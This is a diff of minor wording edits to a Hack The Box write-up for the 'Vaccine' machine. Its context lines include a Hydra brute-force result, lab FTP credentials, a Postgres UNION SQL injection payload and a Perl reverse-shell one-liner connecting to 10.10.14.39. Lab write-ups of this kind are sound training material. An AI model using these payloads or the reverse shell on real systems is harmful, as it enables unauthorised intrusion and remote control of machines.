@@ -1,4 +1,4 @@
-# NAME: 10.10.10.XX
+# Vaccine: 10.10.10.46
 
 ## Hints
 
@@ -47,7 +47,7 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-07-11 12:41:
 1 of 1 target successfully completed, 1 valid password found
 ```
 
-Had no luck. Put in another 30 minutes or so - and was down a rabbit hole. Looked up a walk-through and discovered that to progress in this machine - you needed credentials from the previous machine. I had these! Or so I thought. The credentials are from the "post-exploitation" phase and located in the `/root` folder of the previous machine (Oopsie). I never do post-exploitation on Hack the Box - and was left frustrated (again) by the starting point boxes. Anyway, the credential found were.
+Had no luck. Put in another 30 minutes or so - and was down a rabbit hole. Looked up a walk-through and discovered that to progress in this machine - you needed credentials from the previous machine. I had these! Or so I thought. The credentials are from the "post-exploitation" phase and located in the `/root` folder of the previous machine (named Oopsie). I never do post-exploitation on Hack the Box - and was left frustrated (again) by the starting point boxes. Anyway, the credential found were.
 
 - Username: `ftpuser`
 - Password: `mc@F1l3ZilL4`
@@ -239,7 +239,7 @@ This is cool and all - but not very useful. I tried to dump credentials but had 
 ' UNION SELECT NULL, NULL, NULL, NULL, usename FROM pg_user; --
 ```
 
-Was kind of at a dead-end at the moment. And started to think the enumeration process was all about the database being Postgres, and that we had a specific version.
+Was kind of at a dead-end at this stage. And started to think the enumeration process was all about the database being Postgres, and that we had a specific version.
 
 ## Getting Command Execution
 
@@ -291,7 +291,7 @@ Then run the command
 
 So basically, we are creating a new table, column, and row. All by running SQL injection in the search box on the web app. Then we run another query that executes the code. This worked the first time!
 
-![Postgres command execution via SQLi](screenshots/80_sqli_commandexecution.png)
+![Postgres command execution via SQLi](screenshots/80_sqli_codeexecution.png)
 
 ## Getting a Reverse Shell
 
@@ -320,7 +320,7 @@ Hurrah! But had some problems getting a stable shell. It kept crashing after a c
 perl -e 'use Socket;$i="10.10.14.39";$p=9002;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
 ```
 
-## Privesc: `postgres` to `
+## Privesc: `postgres` to `root`
 
 I ran linpeas using the `postgres` user. And found a bunch of interesting stuff. To start with, there were credentials in the `dashboard.php` file - used to power the car catalog page on the web app.
 
